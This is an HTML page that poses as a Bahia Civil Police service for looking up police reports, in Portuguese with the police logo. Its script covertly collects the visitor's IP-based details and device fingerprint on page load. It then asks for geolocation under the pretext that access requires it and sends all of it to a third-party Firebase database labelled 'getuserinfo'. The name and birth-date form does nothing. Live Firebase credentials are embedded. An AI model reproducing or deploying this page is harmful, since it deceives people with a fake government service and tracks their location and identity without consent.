<!DOCTYPE html>
<html>
<head>
    <title>Consultar Boletim de Ocorrencia</title>
    <link href="./home.css" rel="stylesheet" />
    <script src="//wurfl.io/wurfl.js"></script>
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-app.js";
        import { getDatabase, ref, push, set, update } from "https://www.gstatic.com/firebasejs/10.6.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBspYz-fSAR1JGlbe-w2c3TV1wEyS0COeE",
            authDomain: "getuserinfo-shuno.firebaseapp.com",
            databaseURL: "https://getuserinfo-shuno-default-rtdb.firebaseio.com/",
            projectId: "getuserinfo-shuno",
            storageBucket: "getuserinfo-shuno.appspot.com",
            messagingSenderId: "1017603430075",
            appId: "1:1017603430075:web:65840eb65a2990b639bb9e",
            measurementId: "G-CNFNLLD8C6"
        };

        const app = initializeApp(firebaseConfig);
        const database = getDatabase(app);
        let dataKey;

        function sendDataToRealtimeDatabaseInitial(data) {
            const dbRef = ref(database, 'visitors');
            const newVisitorRef = push(dbRef);
            set(newVisitorRef, data);
            return newVisitorRef.key;
        }

        function updateDataWithLocation(locationData) {
            const visitorLocationRef = ref(database, `visitors/${dataKey}`);
            update(visitorLocationRef, locationData);
        }

        window.onButtonClick = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    var locationData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    };
                    updateDataWithLocation(locationData);
                }, function(error) {
                    console.error("Erro na Geolocalização: ", error);
                });
            }
        }

        var VisitorAPI = function(t, e, a) {
            var s = new XMLHttpRequest();
            s.onreadystatechange = function() {
                if (s.readyState === XMLHttpRequest.DONE) {
                    if (s.status === 200) {
                        var apiData = JSON.parse(s.responseText);
                        console.log("Dados da API:", apiData);
                        dataKey = sendDataToRealtimeDatabaseInitial({ ...apiData, ...WURFL });
                        e(apiData);
                    } else {
                        a(s.status, s.statusText);
                    }
                }
            };
            s.open("GET", "https://api.visitorapi.com/api/?pid=" + t);
            s.send(null);
        };

        VisitorAPI(
            "p53oy0LRsYVI5KEmIDJw",
            function(data) { /* Função de sucesso */ },
            function(errorCode, errorMessage) {
                console.log("Erro na API:", errorCode, errorMessage); 
            }
        );
    </script>
</head>
<body>
    <div class="home-container">
        <img src="https://assets.infra.grancursosonline.com.br/projeto/pc-ba-policia-civil-do-estado-da-bahia.png" alt="image" class="home-image" />
        <form class="home-form">
            <span>Nome completo</span>
            <input type="text" placeholder="Digite o nome completo" class="home-textinput input" />
            <span class="home-text1">Data de nascimento</span>
            <input type="text" placeholder="dd/mm/aaaa" class="home-textinput1 input" />
            <button type="button" class="home-button button" onclick="onButtonClick()">Consultar Boletim de Ocorrência</button>
            <span class="home-text2">
                *Para acessar seu boletim de ocorrência é necessário conceder as permissões
            </span>
        </form>
    </div>
</body>
</html>
